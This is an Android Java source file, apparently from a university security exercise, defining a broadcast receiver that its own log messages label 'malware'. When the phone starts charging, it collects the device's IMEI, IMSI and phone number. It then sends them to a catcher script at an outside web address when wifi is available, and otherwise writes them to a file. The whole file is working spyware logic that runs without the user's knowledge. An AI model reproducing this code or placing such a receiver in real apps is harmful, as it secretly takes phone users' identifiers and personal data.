package uvigo.teleco.deny.seguridad15;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**Esta clase cuando se cargue el movil va a recibir una señal y ejecutará onReceive
 * Created by Deny on 17/11/2014.
 */
public class CHARGEReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if(Localizacion.hayWifi(context)) { //si hay wifi
            Log.d("malware", "Hay wifi y estoy cargando");
            InfoSender sender = new InfoSender("http://www.myweb.com/catcher.php", PhoneInfo.getMyIMEI(context), PhoneInfo.getMyIMSI(context), PhoneInfo.getPhoneNumber(context)); //creo el infosender
            sender.run();
        }else { //si no hay wifi lo mando solo escribir en un archivo
            Log.d("malware", "No hay wifi y estoy cargando");
            InfoSender sender = new InfoSender("http://www.myweb.com/catcher.php", PhoneInfo.getMyIMEI(context), PhoneInfo.getMyIMSI(context), PhoneInfo.getPhoneNumber(context)); //creo el infosender
            sender.writeToFile();
        }
    }
}
